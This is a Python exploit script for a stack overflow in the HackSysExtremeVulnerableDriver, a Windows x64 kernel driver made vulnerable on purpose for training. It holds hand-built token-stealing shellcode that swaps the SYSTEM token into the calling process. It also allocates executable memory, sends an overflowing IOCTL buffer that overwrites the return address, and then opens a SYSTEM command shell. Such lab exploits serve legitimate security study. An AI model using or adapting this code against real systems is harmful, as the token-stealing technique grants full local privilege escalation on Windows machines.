#!/usr/bin/python

#
# HackSysExtremeVulnerableDriver (HEVD) Windows x64 Kernel exploit
#   Stack Overflow
#
# Mariusz B. / mgeeky, '17
#

import os
import sys
import struct
import ctypes

INSERT_INT3 = True

GENERIC_READ = 0x80000000
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
OPEN_EXISTING = 3
LANG_ENGLISH = 9
SUBLANG_DEFAULT = 1
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_FLAG_OVERLAPPED = 0x40000000
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

HEVD_FILE_NAME = ur"\\.\HackSysExtremeVulnerableDriver"
IOCTL_CODE = 0x00222003

class Driver:
    fileName = ''

    def __init__(self, fileName):
        self.fileName = fileName

    def open(self):
        self.handle = ctypes.windll.kernel32.CreateFileW(
            self.fileName,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            None
        )

        if not self.handle or self.handle == -1:
            print "[!] Could not open Driver's handle: " + formatError()
            return False

        print '[+] Driver: "{}" opened, handle: 0x{:04x}'.format(self.fileName, self.handle)
        return True


    def sendIoctl(self, ioctl, inpBuf, inputSize):
        ret = ctypes.c_ulong()
        inputBuf = getPtr(inpBuf)

        print '[+] Sending IOCTL: 0x{:08x}, input addr: 0x{:08x}, size: {}'.format(ioctl, inputBuf, inputSize)

        print '[+] Printing last 128 bytes of input buffer:'
        print hex_dump_memory(inputBuf + inputSize - 128, 128)

        sys.stdout.flush()
        
        out = ctypes.windll.kernel32.DeviceIoControl(
            self.handle, 
            ioctl, 
            inputBuf, 
            inputSize, 
            None, 
            0, 
            ctypes.byref(ret), 
            None 
        )

        if not out:
            print '[!] IOCTL Failed: ' + formatError()

        return out

def formatError():
    errCode = ctypes.windll.kernel32.GetLastError()
    buff = ctypes.create_string_buffer(1024)
    ctypes.windll.kernel32.FormatMessageA(
        FORMAT_MESSAGE_FROM_SYSTEM,
        0,
        errCode,
        (((SUBLANG_DEFAULT) << 10) | (LANG_ENGLISH)),
        buff,
        1024,
        0
    )

    return 'error: {!s}, {}'.format(errCode, repr(buff.value.strip()))


def shellcode():

    CURRENT_THREAD      = 0x188         # nt!_KPCR.Pcrb.CurrentThread (_KTHREAD)
    APC_PROCESS         = 0x98 + 0x20   # _KTHREAD.ApcState.Process
    ACTIVE_PROC_LINKS   = 0x2e8         # _EPROCESS.ActiveProcessLinks
    TOKEN_OFFSET        = 0x358         # _EPROCESS.Token

    shellc = "\x90\x90\x90\x90"

    if INSERT_INT3: 
        print '[?] Shellcode is using INT3 opcodes.'
        shellc += "\xcc\x90\x90\x90\x90"

    shellc += "\xB9" + struct.pack("<L", os.getpid())                                   # mov ecx, PID
    shellc += "\x65\x48\x8B\x04\x25" + struct.pack('<H', CURRENT_THREAD) + "\x00\x00"   # mov rax,QWORD PTR gs:0x188
    shellc += "\x48\x8B\x80" + struct.pack('<H', APC_PROCESS) + "\x00\x00"              # mov rax,QWORD PTR [rax + 0xb8] EPROCESS
    shellc += "\x48\x8d\x80" + struct.pack('<H', ACTIVE_PROC_LINKS) + "\x00\x00"        # lea rax,[rax+0x2f0] # ActiveProcessLink
    
    shellc += "\x48\x8b\x00"                                                            # mov rax,QWORD PTR [rax]
    shellc += "\x48\x8b\x58\xf8"                                                        # mov rbx,QWORD PTR [rax-0x8] # UniqueProcessID
    shellc += "\x48\x83\xfb\x04"                                                        # cmp rbx,0x4   # PID == 4 -> SYSTEM
    shellc += "\x75\xf3"                                                                # jne
    shellc += "\x48\x8b\x58" + struct.pack('<H', (TOKEN_OFFSET - ACTIVE_PROC_LINKS))    # mov rbx, QWORD PTR [rax+0x68] # GET TOKEN of SYSTEM
    
    shellc += "\x53"                                                                    # PUSH RBX
    shellc += "\x48\x8b\x00"                                                            # mov    rax,QWORD PTR [rax]
    shellc += "\x48\x8b\x58\xf8"                                                        # mov    rbx,QWORD PTR [rax-0x8] # UniqueProcessID
    shellc += "\x39\xcb"                                                                # cmp    ebx, ecx # our PID
    shellc += "\x75\xf5"                                                                # jne
    shellc += "\x5b"                                                                    # POP RBX
    shellc += "\x48\x89\x58\x68" + struct.pack('<H', (TOKEN_OFFSET - ACTIVE_PROC_LINKS))# mov    QWORD PTR[rax + 0x68], rbx
    
    shellc += "\x48\x31\xC0"                                                            # NTSTATUS -> STATUS_SUCCESS
    
    if INSERT_INT3: shellc += "\xcc"
    
    shellc += "\x48\x83\xC4\x28"                                                        # add rsp, 0x28
    shellc += "\xC3"                                                                    # ret

    return (getPtr(shellc), len(shellc))

def allocateShellcode():

    shellcAddr, shellcSize = shellcode()
    print '[+] Original shellcode stored at: 0x{:08x}, with size: {}'.format(shellcAddr, shellcSize)

    allocd = ctypes.windll.kernel32.VirtualAlloc(
        None,
        shellcSize,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    )

    if not allocd:
        print "[!] Could not allocate buffer for the shellcode: " + formatError()
        return 0

    ctypes.memmove(allocd, shellcAddr, shellcSize)

    print '[>] Shellcode moved to allocation at: 0x{:08x}'.format(allocd)
    return allocd, shellcSize

def hex_dump_memory(ptr, num):
    import ctypes
    
    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%016x | ' % (ptr + i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)
    return '\n'.join(lines)

def getPtr(buf):
    return id(buf) + 32

def exploit(drv):
    allocd, shellcSize = allocateShellcode()
    if not allocd:
        print '[!] Shellcode has not been allocated properly.'
        return False
    
    buff_len = 2056 + 8
    buff = "A" * 2056 + struct.pack('<Q', allocd)

    if drv.sendIoctl(IOCTL_CODE, buff, buff_len):
        print '[+] Exploit may have succeeded!'

        os.system("whoami")
        os.system("cmd")

        return True

    print '[-] Exploit has failed.'
    return False


def main(argv):
    print '''
    HackSysExtremeVulnerableDriver (x64)
    Local Privilege Escalation exploit's pack'
    Mariusz B. / mgeeky, '17version
'''

    drv = Driver(HEVD_FILE_NAME)
    if not drv.open():
        return False

    return exploit(drv)

if __name__ == '__main__':
    main(sys.argv)